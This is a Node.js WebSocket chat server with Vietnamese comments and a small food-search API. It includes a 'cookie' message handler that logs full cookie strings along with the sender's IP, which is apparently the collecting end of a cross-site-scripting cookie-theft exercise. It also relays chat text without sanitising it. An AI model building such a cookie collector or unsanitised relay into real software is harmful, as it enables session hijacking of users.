// server.js
const http = require('http');
const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const MAX_MESSAGE_LENGTH = 2000;
const MAX_STORED_MESSAGES = 1000; // chỉ giữ 1000 tin nhắn mới nhất

// bộ nhớ tạm để lưu tin nhắn
const messages = [];

const foods = [
    "Phở bò",
    "Phở gà",
    "Bún chả",
    "Bánh mì pate",
    "Bánh cuốn",
    "Bánh xèo",
    "Gỏi cuốn",
    "Cơm tấm",
    "Chả cá Lã Vọng",
    "Bún bò Huế",
    "Hủ tiếu",
    "Cà phê sữa đá"
];

// hàm bỏ dấu tiếng Việt
function removeAccents(str) {
    return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

// HTTP server cơ bản
const server = http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);

    // API GET /foods?search=...
    if (url.pathname === '/foods' && req.method === 'GET') {
        const search = url.searchParams.get('search') || '';
        const normalizedSearch = removeAccents(search.toLowerCase());

        const result = foods.filter(f =>
            removeAccents(f.toLowerCase()).includes(normalizedSearch)
        );

        res.writeHead(200, {
            'Content-Type': 'application/json; charset=utf-8',
            'Access-Control-Allow-Origin': '*',       // cho phép tất cả origin gọi
            'Access-Control-Allow-Methods': 'GET',    // chỉ cho GET
        });
        res.end(JSON.stringify({
            search,
            count: result.length,
            data: result
        }));
        return;
    }


    // Nếu không match API nào
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('WS server running\n');
});

// track raw sockets để shutdown an toàn
const rawSockets = new Set();
server.on('connection', (socket) => {
    rawSockets.add(socket);
    socket.on('close', () => rawSockets.delete(socket));
});

const wss = new WebSocket.Server({ server });

// helper
function escapeForLog(s = '') {
    return String(s);
}

wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log(`Client connected: ${ip}`);

    // gửi chào mừng
    ws.send(JSON.stringify({ system: true, text: 'Welcome to WS server' }));

    // gửi lại toàn bộ tin nhắn cũ
    messages.forEach((msg) => ws.send(msg));

    ws.on('message', (raw) => {
        const rawStr = typeof raw === 'string' ? raw : raw.toString('utf8');

        let payload;
        try {
            payload = JSON.parse(rawStr);
        } catch (err) {
            ws.send(JSON.stringify({ error: 'Invalid message format. Expect JSON.' }));
            return;
        }

        // xử lý khi type = cookie
        if (payload.type === 'cookie') {
            const v = String(payload.value || '');
            console.log(`[COOKIE][from ${ip}] full="${v}"`);

            try {
                ws.send(JSON.stringify({ ok: true, type: 'cookie_received' }));
            } catch (e) { }
            return;
        }

        // xử lý tin nhắn chat bình thường
        const { user, text } = payload;
        if (typeof user !== 'string' || typeof text !== 'string') {
            ws.send(JSON.stringify({ error: 'Invalid message fields. Expect { user: string, text: string }' }));
            return;
        }

        if (text.length > MAX_MESSAGE_LENGTH) {
            ws.send(JSON.stringify({ error: 'Message too long' }));
            return;
        }

        const safeUser = user.trim().slice(0, 50);
        const safeText = text.slice(0, MAX_MESSAGE_LENGTH);

        const out = JSON.stringify({ user: safeUser, text: safeText, ts: Date.now() });

        // lưu tin nhắn
        messages.push(out);
        if (messages.length > MAX_STORED_MESSAGES) {
            messages.shift();
        }

        console.log(`[MSG] ${escapeForLog(safeUser)}: ${escapeForLog(safeText)}`);

        // phát cho tất cả client
        wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN) client.send(out);
        });
    });

    ws.on('close', () => {
        console.log(`Client disconnected: ${ip}`);
    });

    ws.on('error', (err) => {
        console.error('WS error', err);
    });
});

// Graceful shutdown
let shuttingDown = false;
function gracefulShutdown(signal) {
    if (shuttingDown) return;
    shuttingDown = true;
    console.log(`${signal} received — shutting down server...`);

    server.close(() => console.log('HTTP server closed.'));
    wss.close(() => console.log('WebSocket server closed.'));

    wss.clients.forEach((client) => {
        try { client.terminate(); } catch (e) { }
    });

    rawSockets.forEach((s) => {
        try { s.destroy(); } catch (e) { }
    });

    setTimeout(() => process.exit(0), 1000);
}

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

process.on('unhandledRejection', (reason, p) => {
    console.error('Unhandled Rejection at Promise', p, 'reason:', reason);
});

server.listen(PORT, () => {
    console.log(`WebSocket server listening on ws://localhost:${PORT}`);
});
